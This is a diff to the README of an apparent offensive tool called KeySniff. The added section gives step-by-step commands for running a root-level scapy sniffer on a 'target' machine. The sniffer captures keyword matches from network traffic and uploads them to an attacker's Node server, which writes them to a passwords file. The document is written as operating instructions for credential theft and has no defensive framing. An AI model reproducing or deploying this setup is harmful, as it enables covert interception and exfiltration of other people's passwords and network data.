@@ -7,7 +7,7 @@ KeySniff has two parts:
 
 # Usage
 
-## On Server Side
+## On Server's Side
 1. Install NodeJS on your server.
 ```bash
 curl -sL https://deb.nodesource.com/setup_16.x -o /tmp/nodesource_setup.sh;
@@ -27,3 +27,16 @@ sudo npm install
 ```bash
 sudo node server.js --port 8080 --key secret-key --output passowrds.txt
 ```
+
+## On Target's Side
+1. Make sure that the target machine supports Python3 and install the dependencies:
+```bash
+sudo pip3 install scapy
+```
+
+2. Initiate the client with the correct configurations as arguments:
+```bash
+sudo python3 keySniff.py -p [PORT] -i [INTERFACE] -f [My-Keyword] -s http://[NODE-SERVER-IP]/upload -k [SECRET-KEY]
+```
+
+3. When the keyword will be captured, the agent will send it to the Node server and you'll see in the file.
